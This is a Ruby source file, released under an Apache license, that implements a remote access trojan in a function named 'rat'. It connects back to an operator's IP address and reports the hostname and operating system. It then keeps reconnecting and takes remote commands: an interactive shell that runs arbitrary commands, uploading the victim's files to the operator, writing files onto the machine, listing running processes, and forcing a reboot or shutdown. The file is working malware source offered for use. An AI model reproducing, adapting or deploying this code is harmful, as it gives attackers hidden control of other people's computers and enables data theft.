=begin
Copyright 2023 Chris Basinger

Licensed under the Apache License, Version 2.0(the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
=end
#!/usr/bin/ruby
require 'socket'

def rat(ip)
  Thread.new do
    server = TCPServer.new 7777
    loop do
      server.accept.close
    end
  end
  begin
    socket = TCPSocket.new(ip, 6666)
    username = `hostname`
    if username.include? '\\'
      username = username.split('\\')[1]
    end
    socket.puts username
    if Gem.win_platform?
      socket.puts 'Windows'
    else
      socket.puts 'Linux'
    end

    loop do
      command, file, format = socket.gets.chomp.split(' ')
      case command
      when 'session'
        loop do
          cmd = socket.gets.chomp
          if cmd == 'exit'
            break
          end
          begin
            socket.puts `#{cmd}`
          rescue Errno::ENOENT
            # This fixes a bug where `cd path` raises an exception
            if cmd.start_with?('cd')
              Dir.chdir cmd.split(' ').last
            elsif cmd == 'sudo reboot'
              exec cmd
            else
              socket.puts 'invalid command'
            end
          end
          socket.puts 'done'
        end
      when 'get'
        if File.exist? file
          if format == 'binary'
            content = File.binread file
          elsif format == 'text'
            content = File.read file
          else
            socket.puts 'done'
          end
          socket.puts content.length
          socket.write content
        else
          socket.puts 'error'
        end

      when 'put'

        if format == 'binary'
          file = File.open(file,'wb')
        elsif format == 'text'
          file = File.open(file,'w')
        else
          socket.puts 'done'
        end

        loop do
          content = socket.gets.chomp
          if content == 'done'
            break
          end
          file.puts content
        end
        file.close
      when 'latency'
        socket.puts 'done'
      when 'programs'
        if Gem.win_platform?
          socket.puts `tasklist`
        else
          socket.puts `ps aux`
        end
        socket.puts 'done'
      when 'reboot'
        if Gem.win_platform?
          exec 'shutdown /s'
        else
          exec 'sudo reboot'
        end
      end
    end
    # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
  rescue
    sleep 1
    retry
  end

end